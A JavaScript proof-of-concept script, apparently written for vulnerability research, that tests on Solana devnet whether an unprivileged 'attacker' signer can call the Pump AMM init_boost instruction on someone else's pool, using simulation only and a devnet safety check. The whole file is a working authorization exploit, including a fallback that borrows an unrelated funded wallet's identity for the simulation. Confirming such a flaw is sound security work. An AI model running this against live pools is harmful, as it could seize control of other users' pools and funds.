import fs from "node:fs";
import { BorshCoder } from "@coral-xyz/anchor";
import {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  NATIVE_MINT,
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddressSync,
} from "@solana/spl-token";
import bs58 from "bs58";

const RPC = process.env.DEVNET_RPC || "https://api.devnet.solana.com";
const DEVNET_GENESIS = "EtWTRABZaYq6iMfeYKouRu166VU2xqa1wcaWoxPkrZBG";
const PUMP_AMM = new PublicKey("pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA");
const PUMP = new PublicKey("6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P");
const GLOBAL_CONFIG = new PublicKey("ADyA8hdefvWN2dbGGWFotbzWxrAvLW83WG6QCVXvJKqw");
const TARGET_POOL = new PublicKey("2q5PRCtNy9zvWvDAVEXoW87GGKz9T9eMdjTQWoHghYxU");

function emit(status, extra = {}) {
  console.log(JSON.stringify({ status, ...extra }, null, 2));
}
function tokenAmount(data) {
  return data && data.length >= 72 ? data.readBigUInt64LE(64) : null;
}
function asBigInt(v) {
  return BigInt(v?.toString?.() ?? v);
}
function simData(entry) {
  if (!entry?.data) return null;
  return Buffer.from(Array.isArray(entry.data) ? entry.data[0] : entry.data, "base64");
}
async function rawSimulate(serialized, sigVerify, addresses) {
  const r = await fetch(RPC, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      jsonrpc: "2.0",
      id: 1,
      method: "simulateTransaction",
      params: [serialized.toString("base64"), {
        encoding: "base64",
        commitment: "confirmed",
        sigVerify,
        replaceRecentBlockhash: !sigVerify,
        accounts: { encoding: "base64", addresses: addresses.map(String) },
      }],
    }),
  });
  const j = await r.json();
  if (j.error) throw new Error(JSON.stringify(j.error));
  return j.result.value;
}
async function getMany(connection, keys) {
  const out = [];
  for (let i = 0; i < keys.length; i += 100) {
    out.push(...await connection.getMultipleAccountsInfo(keys.slice(i, i + 100), "confirmed"));
  }
  return out;
}

const connection = new Connection(RPC, "confirmed");
const genesis = await connection.getGenesisHash();
if (genesis !== DEVNET_GENESIS) {
  emit("SAFETY_ABORT_NOT_DEVNET", { genesis });
  process.exit(2);
}
console.log(`SAFETY_GATE devnet genesis verified: ${genesis}`);

// Try to obtain a genuinely funded ephemeral signer BEFORE any heavy RPC reads.
const ephemeral = Keypair.generate();
let attackerPubkey = ephemeral.publicKey;
let attackerKeypair = ephemeral;
let sigVerify = true;
let attackerSource = "ephemeral-devnet-airdrop";
try {
  const airdropSig = await connection.requestAirdrop(ephemeral.publicKey, 5_000_000);
  await connection.confirmTransaction(airdropSig, "confirmed");
  console.log(`AIRDROP_OK attacker=${ephemeral.publicKey.toBase58()} balance=${await connection.getBalance(ephemeral.publicKey, "confirmed")}`);
} catch (e) {
  console.log(`AIRDROP_FAILED ${String(e?.message || e)}`);
  attackerKeypair = null;
  sigVerify = false;
}

const idl = JSON.parse(fs.readFileSync(new URL("../../idl/pump_amm.json", import.meta.url), "utf8"));
const coder = new BorshCoder(idl);
const [globalInfo, poolInfo] = await Promise.all([
  connection.getAccountInfo(GLOBAL_CONFIG, "confirmed"),
  connection.getAccountInfo(TARGET_POOL, "confirmed"),
]);
if (!globalInfo || !poolInfo) throw new Error("required Devnet state missing");
const global = coder.accounts.decode("GlobalConfig", globalInfo.data);
const pool = coder.accounts.decode("Pool", poolInfo.data);
const globalAdmin = new PublicKey(global.admin);
const boostAuthority = new PublicKey(global.boostAuthority ?? global.boost_authority);
const boostEnabled = Boolean(global.boostEnabled ?? global.boost_enabled);
const expectedCreator = new PublicKey(pool.creator);
const baseMint = new PublicKey(pool.baseMint ?? pool.base_mint);
const quoteMint = new PublicKey(pool.quoteMint ?? pool.quote_mint);
const poolBaseTokenAccount = new PublicKey(pool.poolBaseTokenAccount ?? pool.pool_base_token_account);
const poolQuoteTokenAccount = new PublicKey(pool.poolQuoteTokenAccount ?? pool.pool_quote_token_account);
const coinCreator = new PublicKey(pool.coinCreator ?? pool.coin_creator);
const virtualBefore = asBigInt(pool.virtualQuoteReserves ?? pool.virtual_quote_reserves);
const [derivedCreator] = PublicKey.findProgramAddressSync([Buffer.from("pool-authority"), baseMint.toBuffer()], PUMP);
if (!expectedCreator.equals(derivedCreator)) throw new Error("target is no longer a canonical Pump pool");
if (!quoteMint.equals(NATIVE_MINT)) throw new Error("target quote mint changed");
if (virtualBefore !== 0n) throw new Error(`target already boosted: virtual=${virtualBefore}`);
if (!boostEnabled) throw new Error("BOOST disabled on Devnet");

const [boostVaultAuthority] = PublicKey.findProgramAddressSync([Buffer.from("boost_vault"), TARGET_POOL.toBuffer()], PUMP_AMM);
const boostVault = getAssociatedTokenAddressSync(NATIVE_MINT, boostVaultAuthority, true, TOKEN_PROGRAM_ID);
const [poolQuoteInfo, boostBeforeInfo] = await Promise.all([
  connection.getAccountInfo(poolQuoteTokenAccount, "confirmed"),
  connection.getAccountInfo(boostVault, "confirmed"),
]);

// If the public faucet rejected the ephemeral signer, pick a funded ordinary
// System-owned coin-creator wallet from Devnet. sigVerify=false is only a
// simulation transport workaround; Pump AMM still receives that account with
// is_signer=true. Any holder of that wallet could produce the same real signature.
if (!attackerKeypair) {
  const poolDesc = idl.accounts.find((x) => x.name === "Pool");
  const rows = await connection.getProgramAccounts(PUMP_AMM, {
    commitment: "confirmed",
    filters: [{ memcmp: { offset: 0, bytes: bs58.encode(Buffer.from(poolDesc.discriminator)) } }],
    dataSlice: { offset: 211, length: 32 },
  });
  const seen = new Set();
  const candidates = [];
  for (const row of rows.slice(0, 1200)) {
    if (row.account.data.length !== 32) continue;
    const k = new PublicKey(row.account.data);
    const s = k.toBase58();
    if (seen.has(s) || k.equals(expectedCreator) || k.equals(globalAdmin) || k.equals(boostAuthority)) continue;
    seen.add(s);
    candidates.push(k);
    if (candidates.length >= 250) break;
  }
  const infos = await getMany(connection, candidates);
  let chosen = null;
  for (let i = 0; i < candidates.length; i++) {
    const info = infos[i];
    if (!info) continue;
    if (!info.owner.equals(SystemProgram.programId)) continue;
    if (info.lamports < 5_000_000) continue;
    chosen = { key: candidates[i], lamports: info.lamports };
    break;
  }
  if (!chosen) {
    emit("INCONCLUSIVE_NO_FUNDED_UNPRIVILEGED_SIGNER", { coinCreator: coinCreator.toBase58() });
    process.exit(3);
  }
  attackerPubkey = chosen.key;
  attackerSource = `funded-system-wallet-sim-only:${chosen.lamports}`;
  console.log(`FALLBACK_ATTACKER ${attackerPubkey.toBase58()} lamports=${chosen.lamports}`);
}

if (attackerPubkey.equals(expectedCreator) || attackerPubkey.equals(globalAdmin) || attackerPubkey.equals(boostAuthority)) {
  throw new Error("attacker unexpectedly equals privileged identity");
}

const [eventAuthority] = PublicKey.findProgramAddressSync([Buffer.from("__event_authority")], PUMP_AMM);
const initDesc = idl.instructions.find((x) => x.name === "init_boost");
if (!initDesc) throw new Error("init_boost missing from IDL");
const ix = new TransactionInstruction({
  programId: PUMP_AMM,
  keys: [
    { pubkey: TARGET_POOL, isSigner: false, isWritable: true },
    { pubkey: GLOBAL_CONFIG, isSigner: false, isWritable: false },
    { pubkey: attackerPubkey, isSigner: true, isWritable: true },
    { pubkey: baseMint, isSigner: false, isWritable: false },
    { pubkey: quoteMint, isSigner: false, isWritable: false },
    { pubkey: poolBaseTokenAccount, isSigner: false, isWritable: false },
    { pubkey: poolQuoteTokenAccount, isSigner: false, isWritable: true },
    { pubkey: boostVaultAuthority, isSigner: false, isWritable: false },
    { pubkey: boostVault, isSigner: false, isWritable: true },
    { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    { pubkey: ASSOCIATED_TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    { pubkey: eventAuthority, isSigner: false, isWritable: false },
    { pubkey: PUMP_AMM, isSigner: false, isWritable: false },
  ],
  data: Buffer.from(initDesc.discriminator),
});

const tx = new Transaction().add(ix);
tx.feePayer = attackerPubkey;
tx.recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash;
if (attackerKeypair) tx.sign(attackerKeypair);
const serialized = tx.serialize({ requireAllSignatures: sigVerify, verifySignatures: sigVerify });

console.log(JSON.stringify({
  test: "funded foreign signer init_boost",
  pool: TARGET_POOL.toBase58(),
  expectedPoolCreator: expectedCreator.toBase58(),
  attackerCreator: attackerPubkey.toBase58(),
  attackerSource,
  sigVerify,
  attackerEqualsExpectedCreator: attackerPubkey.equals(expectedCreator),
  attackerEqualsAdmin: attackerPubkey.equals(globalAdmin),
  attackerEqualsBoostAuthority: attackerPubkey.equals(boostAuthority),
  poolQuoteBefore: tokenAmount(poolQuoteInfo?.data)?.toString() ?? null,
  virtualQuoteBefore: virtualBefore.toString(),
  boostVault: boostVault.toBase58(),
  boostVaultExistsBefore: Boolean(boostBeforeInfo),
  boostVaultAmountBefore: tokenAmount(boostBeforeInfo?.data)?.toString() ?? null,
}, null, 2));

const result = await rawSimulate(serialized, sigVerify, [TARGET_POOL, poolQuoteTokenAccount, boostVault]);
console.log("--- FUNDED INIT_BOOST SIMULATION LOGS ---");
for (const line of result.logs || []) console.log(line);
console.log("--- END LOGS ---");

const postPoolData = simData(result.accounts?.[0]);
const postQuoteData = simData(result.accounts?.[1]);
const postBoostData = simData(result.accounts?.[2]);
let virtualAfter = null;
if (postPoolData) {
  try {
    const postPool = coder.accounts.decode("Pool", postPoolData);
    virtualAfter = asBigInt(postPool.virtualQuoteReserves ?? postPool.virtual_quote_reserves);
  } catch {}
}
const reachedTokenOrSystem = (result.logs || []).some((x) => /Program (AToken|Tokenkeg|11111111111111111111111111111111)/.test(x));

if (result.err === null) {
  emit("CONFIRMED_FOREIGN_INIT_BOOST", {
    proof: "A funded unprivileged signer different from canonical pool.creator, GlobalConfig.admin, and boost_authority successfully simulated init_boost.",
    sigVerify,
    attackerSource,
    pool: TARGET_POOL.toBase58(),
    expectedPoolCreator: expectedCreator.toBase58(),
    attackerCreator: attackerPubkey.toBase58(),
    reachedTokenOrSystem,
    virtualQuoteBefore: virtualBefore.toString(),
    virtualQuoteAfterSim: virtualAfter?.toString() ?? null,
    poolQuoteBefore: tokenAmount(poolQuoteInfo?.data)?.toString() ?? null,
    poolQuoteAfterSim: tokenAmount(postQuoteData)?.toString() ?? null,
    boostVaultBefore: tokenAmount(boostBeforeInfo?.data)?.toString() ?? null,
    boostVaultAfterSim: tokenAmount(postBoostData)?.toString() ?? null,
  });
  process.exit(0);
}

emit("REJECTED_FUNDED_INIT_BOOST", {
  simulationError: result.err,
  sigVerify,
  attackerSource,
  expectedPoolCreator: expectedCreator.toBase58(),
  attackerCreator: attackerPubkey.toBase58(),
  reachedTokenOrSystem,
  virtualQuoteAfterSim: virtualAfter?.toString() ?? null,
  note: "If logs show an explicit creator/pool authorization mismatch, ZD-02 is killed. Any later semantic/liquidity error means authorization still passed and the candidate should be refined.",
});
process.exit(12);
